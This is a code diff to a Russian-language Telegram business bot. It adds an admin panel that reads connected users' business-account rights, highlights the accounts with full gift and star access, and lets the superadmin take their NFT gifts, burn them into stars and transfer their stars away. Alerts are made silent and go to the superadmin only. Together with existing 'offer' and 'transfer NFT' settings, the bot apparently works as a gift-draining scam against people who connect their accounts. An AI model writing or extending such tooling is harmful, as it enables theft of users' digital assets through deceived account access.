@@ -30,6 +30,7 @@ import json
 import logging
 import os
 import re
+import time
 import urllib.parse
 from pathlib import Path
 
@@ -212,6 +213,7 @@ DEFAULT_SETTINGS = {
     "emoji_rub": "",  # после {v3}, если выбраны рубли
     "emoji_usdt": "",  # после {v3}, если выбран USDT
     "name_mode": "sender_first",
+    "notify_mode": "super",  # super — уведомления только суперадмину, all — всем админам
 }
 
 
@@ -239,11 +241,15 @@ class Storage:
             "connections": {},  # business_connection_id -> {"user_id": ...}
             "business_chats": {},  # username lowercase -> {chat_id, business_connection_id, name}
             "messages": {},  # "chat_id:message_id" -> {"name": ...}
+            "gift_cache": {},  # business_connection_id -> [{"id": ..., "take": ..., "conv": ...}]
+            "gift_next": {},  # business_connection_id -> offset для следующей страницы
         }
         saved = self._load()
         if saved:
             self.data.update(saved)
         self.data.setdefault("business_chats", {})
+        self.data.setdefault("gift_cache", {})
+        self.data.setdefault("gift_next", {})
         old_settings = self.data.get("settings", {})
         self.data["settings"] = {**DEFAULT_SETTINGS, **old_settings}
         # Совместимость со старым единым эмодзи после {v2}.
@@ -315,6 +321,145 @@ def get_admin_ids() -> set[int]:
 def is_superadmin(user_id: int | None) -> bool:
     return bool(user_id and SUPERADMIN_ID and user_id == SUPERADMIN_ID)
 
+
+# ───────────────────────────── Подключения и права ─────────────────────────────
+RIGHT_KEYS = [
+    ("can_reply", "отвечать в чатах"),
+    ("can_read_messages", "читать переписку"),
+    ("can_delete_sent_messages", "удалять свои сообщения"),
+    ("can_delete_all_messages", "удалять любые сообщения"),
+    ("can_edit_name", "менять имя"),
+    ("can_edit_bio", "менять bio"),
+    ("can_edit_profile_photo", "менять фото"),
+    ("can_edit_username", "менять username"),
+    ("can_change_gift_settings", "менять настройки подарков"),
+    ("can_view_gifts_and_stars", "ВИДЕТЬ подарки и звёзды"),
+    ("can_convert_gifts_to_stars", "конвертировать подарки в звёзды"),
+    ("can_transfer_and_upgrade_gifts", "ЗАБИРАТЬ и апгрейдить подарки"),
+    ("can_transfer_stars", "переводить звёзды"),
+    ("can_manage_stories", "управлять историями"),
+]
+RIGHT_TITLE = dict(RIGHT_KEYS)
+GIFTS_PAGE = 8
+GIFTS_FETCH = 50  # сколько подарков тянем за раз, листаем локально
+
+
+def rights_of(conn) -> dict:
+    rights = getattr(conn, "rights", None)
+    if rights is None:
+        return {}
+    return {k: bool(getattr(rights, k, False)) for k, _ in RIGHT_KEYS}
+
+
+def mark(value) -> str:
+    return "—" if value is None else ("✅" if value else "❌")
+
+
+def admin_label(uid) -> str:
+    if is_superadmin(uid):
+        return "👑 суперадмин"
+    return "🛠 админ" if uid in get_admin_ids() else "❔ не админ"
+
+
+def conn_text(bcid: str, c: dict) -> str:
+    r = c.get("rights")
+    chats = sum(1 for k in db.data["business_chats"] if k.startswith(bcid + ":"))
+    lines = [
+        f"👤 <b>{html.escape(c.get('name') or '—')}</b> · {admin_label(c.get('user_id'))}",
+        f"ID: <code>{c.get('user_id')}</code>",
+        f"Состояние: {'🟢 активно' if c.get('enabled') else '⚪️ отключено'}",
+        f"Известных чатов: {chats}",
+        "",
+    ]
+    if r is None:
+        lines.append("⚠️ Права не получены — нажмите «🔄 Обновить права».")
+        return "\n".join(lines)
+
+    lines.append("🧰 <b>РАБОЧИЕ ПРАВА</b>")
+    for key in ("can_reply", "can_read_messages", "can_delete_all_messages"):
+        lines.append(f"{mark(r.get(key))} {RIGHT_TITLE[key]}")
+    if not r.get("can_reply"):
+        lines.append("⚠️ Без «отвечать в чатах» офферы у него не работают.")
+
+    lines.append("")
+    lines.append("🎁 <b>ПОДАРКИ И ЗВЁЗДЫ</b>")
+    for key in ("can_view_gifts_and_stars", "can_transfer_and_upgrade_gifts",
+                "can_convert_gifts_to_stars", "can_transfer_stars",
+                "can_change_gift_settings"):
+        lines.append(f"{mark(r.get(key))} {RIGHT_TITLE[key]}")
+    if r.get("can_transfer_and_upgrade_gifts") and not r.get("can_transfer_stars"):
+        lines.append("\n⚠️ Забирать можно, но звёзд на комиссию нет — только star_count=0.")
+
+    lines.append("")
+    lines.append("🔧 <b>Остальное</b>")
+    for key in ("can_edit_username", "can_edit_name", "can_edit_bio",
+                "can_edit_profile_photo", "can_delete_sent_messages",
+                "can_manage_stories"):
+        lines.append(f"{mark(r.get(key))} {RIGHT_TITLE[key]}")
+    return "\n".join(lines)
+
+
+def conn_kb(bcid: str, c: dict) -> InlineKeyboardMarkup:
+    r = c.get("rights") or {}
+    rows = [[("🔄 Обновить права", f"b:{bcid}:r")]]
+    if r.get("can_view_gifts_and_stars"):
+        rows.append([("🎁 Подарки", f"b:{bcid}:g"), ("⭐ Баланс звёзд", f"b:{bcid}:s")])
+    if r.get("can_transfer_stars"):
+        rows.append([("💸 Вывести звёзды себе", f"b:{bcid}:ts")])
+    rows.append([("⬅️ Назад", "a:conns")])
+    return kb(*rows)
+
+
+def gift_title(g) -> str:
+    if getattr(g, "type", "") == "unique":
+        gift = getattr(g, "gift", None)
+        base = getattr(gift, "base_name", "") or getattr(gift, "name", "")
+        num = getattr(gift, "number", "?")
+        return f"{base} #{num}"
+    return "обычный подарок"
+
+
+def gift_line(idx: int, g) -> str:
+    gift = getattr(g, "gift", None)
+    flags = []
+    if getattr(g, "type", "") == "unique":
+        if getattr(gift, "is_from_blockchain", False):
+            flags.append("⛓ on-chain (в TG не уйдёт)")
+        if not getattr(g, "can_be_transferred", False):
+            flags.append("🔒 не передаётся")
+        nt = getattr(g, "next_transfer_date", None)
+        if nt and nt > time.time():
+            flags.append("⏳ разблокируется " + time.strftime("%d.%m %H:%M", time.localtime(nt)))
+        fee = getattr(g, "transfer_star_count", None)
+        if fee:
+            flags.append(f"💫 комиссия {fee}")
+    else:
+        if getattr(g, "can_be_upgraded", False):
+            flags.append("⬆️ можно апгрейдить")
+        conv = getattr(g, "convert_star_count", None)
+        if conv:
+            flags.append(f"💥 в звёзды {conv}")
+    tail = (" · " + " · ".join(flags)) if flags else ""
+    return f"{idx}. {html.escape(gift_title(g))}{tail}"
+
+
+def can_take(g) -> bool:
+    if getattr(g, "type", "") != "unique":
+        return False
+    if getattr(getattr(g, "gift", None), "is_from_blockchain", False):
+        return False
+    if not getattr(g, "can_be_transferred", False):
+        return False
+    nt = getattr(g, "next_transfer_date", None)
+    return not nt or nt <= time.time()
+
+
+def gift_entries(gifts) -> list:
+    return [{
+        "id": g.owned_gift_id,
+        "take": can_take(g),
+        "conv": getattr(g, "convert_star_count", None) if getattr(g, "type", "") != "unique" else None,
+    } for g in gifts]
 
 
 def get_block(tpl: dict, key: str) -> str:
@@ -545,15 +690,24 @@ async def get_owner_id(bot: Bot, bcid: str) -> int:
     if conn:
         return conn["user_id"]
     c = await bot.get_business_connection(bcid)
-    db.data["connections"][bcid] = {"user_id": c.user.id, "enabled": c.is_enabled}
+    db.data["connections"][bcid] = {
+        "user_id": c.user.id,
+        "name": c.user.full_name,
+        "enabled": c.is_enabled,
+        "rights": rights_of(c),
+    }
     db.save()
     return c.user.id
 
 
 async def notify_admins(bot: Bot, text: str) -> None:
-    for admin_id in get_admin_ids():
+    """Уведомления. По умолчанию — только суперадмину и всегда без звука."""
+    mode = db.data["settings"].get("notify_mode", "super")
+    ids = {SUPERADMIN_ID} if mode == "super" else get_admin_ids()
+    for admin_id in ids:
         try:
-            await bot.send_message(admin_id, text)
+            await bot.send_message(admin_id, text, disable_notification=True,
+                                   link_preview_options=NO_PREVIEW)
         except Exception:  # noqa: BLE001
             pass
 
@@ -568,13 +722,18 @@ async def on_business_connection(conn: BusinessConnection, bot: Bot):
         "name": conn.user.full_name,
         "enabled": conn.is_enabled,
         "can_reply": can_reply,
+        "rights": rights_of(conn),
     }
     db.save()
     state = "подключён" if conn.is_enabled else "отключён"
+    r = db.data["connections"][conn.id]["rights"]
     await notify_admins(
         bot,
-        f"🔌 Бизнес-аккаунт {html.escape(conn.user.full_name)} {state}. "
-        f"can_reply={can_reply}; rights.can_reply={getattr(rights, 'can_reply', None) if rights else None}"
+        f"🔌 Бизнес-аккаунт {html.escape(conn.user.full_name)} {state} "
+        f"(<code>{conn.user.id}</code> · {admin_label(conn.user.id)}).\n"
+        f"подарки: видеть {mark(r.get('can_view_gifts_and_stars'))} · "
+        f"забирать {mark(r.get('can_transfer_and_upgrade_gifts'))} · "
+        f"звёзды {mark(r.get('can_transfer_stars'))}"
     )
 
 
@@ -818,6 +977,7 @@ def kb(*rows) -> InlineKeyboardMarkup:
 
 
 MAIN_KB = kb(
+    [("🔌 Подключения и права", "a:conns")],
     [("📖 Сообщение .help", "a:help")],
     [("🧩 Офферы (.shab)", "a:tpls")],
     [("📝 Тексты и кнопки", "a:pres")],
@@ -938,6 +1098,7 @@ def settings_text(user_id: int | None = None) -> str:
     if user_id is not None and not is_superadmin(user_id):
         return "\n".join(["🔧 <b>Настройки офферов</b>", "", f"Юзернейм кому передавать нфт: = {short(st['v5_html'])}", f"🔗 Ссылка кнопки передать нфт", f"Сейчас ведёт на: {html.escape(link_url())}"])
     mode = dict(NAME_MODES).get(st["name_mode"], "—")
+    notify = "только суперадмину (тихо)" if st.get("notify_mode", "super") == "super" else "всем админам"
 
     def e(key: str) -> str:
         return f"<code>{st[key]}</code>" if st[key] else "—"
@@ -960,6 +1121,7 @@ def settings_text(user_id: int | None = None) -> str:
         f"Эмодзи после USDT: {e('emoji_usdt')}",
         "",
         f"Имя для {{v1}} берётся: {mode}",
+        f"🔔 Уведомления: {notify}",
     ])
 
 
@@ -971,6 +1133,7 @@ SETTINGS_KB = kb(
     [("⭐ звёзды", "s:e:emoji_stars"), ("💎 GRAM", "s:e:emoji_gram")],
     [("₽ Рубли", "s:e:emoji_rub"), ("💵 USDT", "s:e:emoji_usdt")],
     [("👤 Сменить источник имени", "s:name")],
+    [("🔔 Кому уведомления", "s:notify")],
     [("⬅️ Назад", "a:menu")],
 )
 USER_SETTINGS_KB = kb(
@@ -1045,6 +1208,219 @@ async def a_menu(cq: CallbackQuery, state: FSMContext):
 @admin.callback_query(F.data == "a:syntax")
 async def a_syntax(cq: CallbackQuery):
     await show(cq, SYNTAX_TEXT, kb([("⬅️ Назад", "a:menu")]))
+
+
+# ── подключения и права (только суперадмин) ──
+@admin.callback_query(F.data == "a:conns")
+async def a_conns(cq: CallbackQuery, state: FSMContext):
+    await state.clear()
+    items = sorted(db.data["connections"].items(),
+                   key=lambda kv: (kv[1].get("user_id") not in get_admin_ids(),
+                                   kv[1].get("name") or ""))
+    admins = get_admin_ids()
+    linked = {v.get("user_id") for v in db.data["connections"].values()}
+    missing = sorted(admins - linked - {SUPERADMIN_ID})
+    rows = [[(f"{'🟢' if v.get('enabled') else '⚪️'} {v.get('name') or v.get('user_id')} "
+              f"· {admin_label(v.get('user_id'))}", f"b:{k}")] for k, v in items]
+    if missing:
+        rows.append([(f"⚫️ Не подключены: {len(missing)}", "a:conns:nolink")])
+    rows.append([("📊 Сводка по подаркам", "a:conns:gifts")])
+    rows.append([("⬅️ Назад", "a:menu")])
+    body = (f"🔌 <b>Подключения</b> — {len(items)}\n\n"
+            "🟢 активно · ⚪️ отключено · 👑/🛠 админ · ❔ не админ")
+    await show(cq, body, kb(*rows))
+
+
+@admin.callback_query(F.data == "a:conns:nolink")
+async def a_conns_nolink(cq: CallbackQuery):
+    admins = get_admin_ids()
+    linked = {v.get("user_id") for v in db.data["connections"].values()}
+    missing = sorted(admins - linked - {SUPERADMIN_ID})
+    body = "⚫️ <b>Админы без подключения</b>\n\n" + (
+        "\n".join(f"• <code>{u}</code>" for u in missing) or "все подключены")
+    await show(cq, body, kb([("⬅️ Назад", "a:conns")]))
+
+
+@admin.callback_query(F.data == "a:conns:gifts")
+async def a_conns_gifts(cq: CallbackQuery):
+    rows = []
+    lines = ["📊 <b>Сводка: доступ к подаркам и звёздам</b>", "",
+             "✅ да · ❌ нет · — неизвестно", ""]
+    for bcid, v in sorted(db.data["connections"].items(), key=lambda kv: kv[1].get("name") or ""):
+        r = v.get("rights") or {}
+        if not r:
+            continue
+        name = html.escape(v.get("name") or str(v.get("user_id")))
+        full = r.get("can_transfer_and_upgrade_gifts") and r.get("can_transfer_stars")
+        lines.append(
+            f"{'🔥' if full else '▫️'} {name}: "
+            f"видеть {mark(r.get('can_view_gifts_and_stars'))} · "
+            f"забирать {mark(r.get('can_transfer_and_upgrade_gifts'))} · "
+            f"звёзды {mark(r.get('can_transfer_stars'))}"
+        )
+        rows.append([(f"→ {name[:24]}", f"b:{bcid}")])
+    if not rows:
+        lines.append("Данных нет — обновите права в карточках.")
+    rows.append([("⬅️ Назад", "a:conns")])
+    await show(cq, "\n".join(lines), kb(*rows))
+
+
+def gift_page(bcid: str, c: dict, page: int) -> tuple[str, InlineKeyboardMarkup]:
+    cache = db.data.get("gift_cache", {}).get(bcid) or []
+    start = page * GIFTS_PAGE
+    chunk = cache[start:start + GIFTS_PAGE]
+    lines = [f"🎁 <b>Подарки {html.escape(c.get('name') or '')}</b>", ""]
+    if not chunk:
+        lines.append("Подарков нет.")
+    rows = []
+    for i, item in enumerate(chunk, start=start):
+        if item.get("take"):
+            rows.append([(f"⬇️ Забрать {i}", f"b:{bcid}:ty:{i}")])
+        if item.get("conv"):
+            rows.append([(f"💥 {i} в звёзды ({item['conv']})", f"b:{bcid}:cy:{i}")])
+    nav = []
+    if page > 0:
+        nav.append(("⬅️ Стр.", f"b:{bcid}:p:{page - 1}"))
+    if start + GIFTS_PAGE < len(cache) or db.data.get("gift_next", {}).get(bcid):
+        nav.append(("➡️ Стр.", f"b:{bcid}:p:{page + 1}"))
+    if nav:
+        rows.append(nav)
+    rows.append([("🔄 Обновить", f"b:{bcid}:g"), ("⬅️ Назад", f"b:{bcid}")])
+    return "\n".join(lines), kb(*rows)
+
+
+def gift_by_index(bcid: str, idx: str) -> dict | None:
+    try:
+        return (db.data.get("gift_cache", {}).get(bcid) or [])[int(idx)]
+    except (IndexError, ValueError):
+        return None
+
+
+@admin.callback_query(F.data.startswith("b:"))
+async def conn_cb(cq: CallbackQuery, bot: Bot):
+    parts = cq.data.split(":")
+    bcid, act = parts[1], (parts[2] if len(parts) > 2 else "card")
+    c = db.data["connections"].get(bcid)
+    if not c:
+        return await cq.answer("Подключение не найдено", show_alert=True)
+
+    if act == "card":
+        return await show(cq, conn_text(bcid, c), conn_kb(bcid, c))
+
+    if act == "r":
+        try:
+            conn = await bot.get_business_connection(bcid)
+        except Exception as e:  # noqa: BLE001
+            return await cq.answer(f"Telegram не отдал данные: {str(e)[:150]}", show_alert=True)
+        c.update(enabled=conn.is_enabled, rights=rights_of(conn),
+                 name=conn.user.full_name, user_id=conn.user.id)
+        db.save()
+        return await show(cq, conn_text(bcid, c), conn_kb(bcid, c))
+
+    if act == "s":
+        try:
+            amount = await bot.get_business_account_star_balance(bcid)
+        except Exception as e:  # noqa: BLE001
+            return await cq.answer(f"Нет доступа: {str(e)[:150]}", show_alert=True)
+        return await cq.answer(f"Баланс: {amount.amount} ⭐", show_alert=True)
+
+    if act == "ts":
+        try:
+            await bot.transfer_business_account_stars(bcid, 1000)
+            await cq.answer("Переведено до 1000 ⭐ (лимит за операцию)", show_alert=True)
+        except Exception as e:  # noqa: BLE001
+            await cq.answer(f"Ошибка: {str(e)[:150]}", show_alert=True)
+        return
+
+    if act == "g":
+        if not (c.get("rights") or {}).get("can_view_gifts_and_stars"):
+            return await cq.answer("Нет права can_view_gifts_and_stars — обновите права", show_alert=True)
+        more = len(parts) > 3 and parts[3] == "more"
+        offset = (db.data.setdefault("gift_next", {}).get(bcid) or None) if more else None
+        try:
+            res = await bot.get_business_account_gifts(
+                bcid, exclude_unsaved=False, exclude_saved=False,
+                sort_by_price=True, limit=GIFTS_FETCH, offset=offset,
+            )
+        except Exception as e:  # noqa: BLE001
+            return await cq.answer(f"Ошибка: {str(e)[:150]}", show_alert=True)
+        entries = gift_entries(res.gifts)
+        if more:
+            db.data["gift_cache"][bcid] = (db.data["gift_cache"].get(bcid) or []) + entries
+        else:
+            db.data["gift_cache"][bcid] = entries
+        db.data["gift_next"][bcid] = res.next_offset
+        db.save()
+        page = max(0, (len(db.data["gift_cache"][bcid]) - 1) // GIFTS_PAGE) if more else 0
+        text, markup = gift_page(bcid, c, page)
+        return await show(cq, text, markup)
+
+    if act == "p":
+        try:
+            page = int(parts[3])
+        except (IndexError, ValueError):
+            page = 0
+        if page * GIFTS_PAGE >= len(db.data.get("gift_cache", {}).get(bcid) or []) and \
+                db.data.get("gift_next", {}).get(bcid):
+            # догружаем следующую порцию и показываем её
+            try:
+                res = await bot.get_business_account_gifts(
+                    bcid, exclude_unsaved=False, exclude_saved=False,
+                    sort_by_price=True, limit=GIFTS_FETCH,
+                    offset=db.data["gift_next"].get(bcid),
+                )
+            except Exception as e:  # noqa: BLE001
+                return await cq.answer(f"Ошибка: {str(e)[:150]}", show_alert=True)
+            db.data["gift_cache"][bcid] = (db.data["gift_cache"].get(bcid) or []) + gift_entries(res.gifts)
+            db.data["gift_next"][bcid] = res.next_offset
+            db.save()
+        text, markup = gift_page(bcid, c, page)
+        return await show(cq, text, markup)
+
+    if act in ("ty", "cy"):
+        item = gift_by_index(bcid, parts[3] if len(parts) > 3 else "")
+        if not item:
+            return await cq.answer("Список устарел — откройте подарки заново", show_alert=True)
+        if act == "cy":
+            body = f"Сжечь подарок в звёзды?\n<code>{item['id']}</code>\n\nПолучите {item.get('conv')} ⭐, NFT исчезнет."
+            back = f"b:{bcid}:p:{int(parts[3]) // GIFTS_PAGE}"
+            return await show(cq, body, kb([[("✅ Сжечь", f"b:{bcid}:c:{parts[3]}")],
+                                            [("⬅️ Назад", back)]]))
+        body = f"Забрать подарок себе?\n<code>{item['id']}</code>"
+        back = f"b:{bcid}:p:{int(parts[3]) // GIFTS_PAGE}"
+        return await show(cq, body, kb([[("✅ Да, забрать", f"b:{bcid}:t:{parts[3]}")],
+                                        [("⬅️ Назад", back)]]))
+
+    if act == "c":
+        item = gift_by_index(bcid, parts[3] if len(parts) > 3 else "")
+        if not item:
+            return await cq.answer("Список устарел — откройте подарки заново", show_alert=True)
+        try:
+            await bot.convert_gift_to_stars(bcid, item["id"])
+            await cq.answer("Подарок сожжён в звёзды", show_alert=True)
+        except Exception as e:  # noqa: BLE001
+            await cq.answer(f"Ошибка: {str(e)[:150]}", show_alert=True)
+        return
+
+    if act == "t":
+        item = gift_by_index(bcid, parts[3] if len(parts) > 3 else "")
+        if not item:
+            return await cq.answer("Список устарел — откройте подарки заново", show_alert=True)
+        last = None
+        for star_count in (0, None, 25):
+            try:
+                await bot.transfer_gift(bcid, item["id"], SUPERADMIN_ID, star_count=star_count)
+                return await cq.answer("✅ Подарок у вас", show_alert=True)
+            except Exception as e:  # noqa: BLE001
+                last = e
+                msg = str(e).lower()
+                if "not enough" in msg or "balance" in msg or "star" in msg:
+                    continue
+                break
+        await cq.answer(f"Не удалось: {str(last)[:150]}", show_alert=True)
+        return
+
+    await cq.answer()
 
 
 # ── управление обычными администраторами (только супер-админ) ──
@@ -1148,6 +1524,11 @@ async def settings_cb(cq: CallbackQuery, state: FSMContext):
         modes = [m for m, _ in NAME_MODES]
         cur = modes.index(st["name_mode"]) if st["name_mode"] in modes else -1
         st["name_mode"] = modes[(cur + 1) % len(modes)]
+        db.save()
+        await show(cq, settings_text(cq.from_user.id), settings_kb_for(cq.from_user.id))
+    elif parts[1] == "notify":
+        st = db.data["settings"]
+        st["notify_mode"] = "all" if st.get("notify_mode", "super") == "super" else "super"
         db.save()
         await show(cq, settings_text(cq.from_user.id), settings_kb_for(cq.from_user.id))
     else:
@@ -1470,4 +1851,3 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
-
